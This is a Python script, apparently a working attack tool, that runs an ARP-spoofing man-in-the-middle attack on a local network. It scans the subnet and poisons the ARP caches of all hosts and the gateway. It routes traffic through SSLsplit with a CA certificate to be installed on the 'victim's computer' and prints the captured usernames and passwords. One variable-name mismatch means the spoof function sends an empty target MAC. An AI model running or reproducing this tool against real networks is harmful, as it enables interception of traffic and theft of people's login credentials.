import scapy.all as scapy
import time
import sys
from MITM.MITM_misc import getMask1Bits, runSSLSplit, fetchPasswd

def getGatewayIP():
    result = scapy.conf.route.route("0.0.0.0")[2]
    return result

def scan(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast / arpRequest

    answeredList = scapy.srp(arpRequestBroadcast, timeout=3, verbose=False)[0]

    resultList = []
    for element in answeredList:
        resultDict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        resultList.append(resultDict)
    return resultList

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")

def spoof(targetIP, hostIP, devices, verbose=True):
    """
    Spoofs `targetIP` saying that we are `hostIP`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    targetMac = ""
    for item in devices:
        if item["ip"] == targetIP:
            targetMAC = item["mac"]

    arpResponse = scapy.ARP(pdst=targetIP, hwdst=targetMac, psrc=hostIP, op='is-at')

    scapy.send(arpResponse, verbose=False)

    if verbose:
        selfMac = scapy.ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, selfMac))

def restore(targetIP, hostIP, devices, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`
    """

    targetMac = ""
    for item in devices:
        if item["ip"] == targetIP:
            targetMAC = item["mac"]

    hostMAC = ""
    for item in devices:
        if item["ip"] == hostIP:
            hostMAC = item["mac"]

    # crafting the restoring packet
    arp_response = scapy.ARP(pdst=targetIP, hwdst=targetMAC, psrc=hostIP, hwsrc=hostMAC)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    scapy.send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, hostMAC))

if __name__ == "__main__":
    import os
    os.system("sh MITM/genKey.sh")
    os.system("clear")
    print("[!] Remember to install MITM/ca.crt into victim's computer")

    host = getGatewayIP()
    print("Gateway IP: ", host)

    leadingOnes = getMask1Bits()
    devices = scan(host + "/" + str(leadingOnes))

    print("Avaliable devices")
    print("---------------------------")
    print("IP                 MAC     ")
    print("---------------------------")

    targets = []
    for item in devices:
        if item["ip"] != host:
            targets.append(item["ip"])
            print(item["ip"], item["mac"], sep = '\t')

    # print progress to the screen
    verbose = False
    # enable ip forwarding
    enable_ip_route()

    sslSplitPid = runSSLSplit()

    visited = []

    try:
        while True:
            for target in targets:
                # telling the `target` that we are the `host`
                spoof(target, host, devices, verbose)
                # telling the `host` that we are the `target`
                spoof(host, target, devices, verbose)
            result = fetchPasswd()

            for item in result:
                have = False
                for item2 in visited:
                    if item2 == item:
                        have = True
                        break
                if have == False:
                    visited.append(item)
                    print("Username:  ", item["username"], sep = "")
                    print("Password:  ", item["password"], sep = "")
                    print("", sep = "")

            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        for target in targets:
            restore(target, host, devices, verbose)
            restore(host, target, devices, verbose)
        print("[+] Arp Spoof Stopped")

        print("[!] Turning off sslsplit, please wait...")
        sslSplitPid.terminate()
        print("[+] SSLsplit Stopped")
